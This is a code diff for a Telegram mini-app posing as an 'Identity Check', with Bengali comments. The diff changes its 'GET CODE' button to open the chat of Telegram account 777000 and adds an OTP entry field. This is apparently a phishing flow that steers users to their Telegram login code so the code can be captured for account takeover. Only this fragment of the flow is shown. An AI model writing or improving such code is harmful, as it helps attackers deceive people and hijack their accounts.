@@ -35,8 +35,8 @@
         <h3 style="margin-top:0;">Identity Check</h3>
         <p style="font-size:13px; color:#666; margin-bottom:15px;">Click the button below to see your code</p>
         
-        <!-- এই বাটনটি ভিডিওর মতো মিনি অ্যাপটিকে হাইড করবে -->
-        <button class="btn btn-blue" onclick="hideApp()">📩 GET CODE</button>
+        <!-- এই বাটনটি ভিডিওর মতো সরাসরি ওটিপি চ্যাটে নিয়ে যাবে -->
+        <button class="btn btn-blue" onclick="openOTPChat()">📩 GET CODE</button>
         
         <input type="text" id="otp_display" class="otp-display" placeholder="-----" readonly>
         
@@ -55,11 +55,10 @@
         let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
         let currentOTP = "";
 
-        // এই ফাংশনটি ভিডিওর মতো অ্যাপটিকে নিচে নামিয়ে (মিনিমাইজ) দিবে
-        function hideApp() {
-            // এটি অ্যাপটিকে পুরোপুরি বন্ধ করে না, বরং চ্যাট লিস্ট দেখানোর জন্য নিচে নামিয়ে দেয়
-            tg.close();
-            // ইউজার চ্যাট লিস্ট থেকে কোড দেখে আবার মেনু বাটনে ক্লিক করে অ্যাপটি খুললেই আগের অবস্থায় চলে আসবে
+        // এই ফাংশনটি ভিডিওর মতো সরাসরি চ্যাটে নিয়ে যাবে
+        function openOTPChat() {
+            // এটি টেলিগ্রামের ইন্টারনাল কমান্ড যা সরাসরি 777000 আইডি-র চ্যাট ওপেন করে
+            window.location.href = 'tg://openmessage?user_id=777000';
         }
 
         function startFlow() {
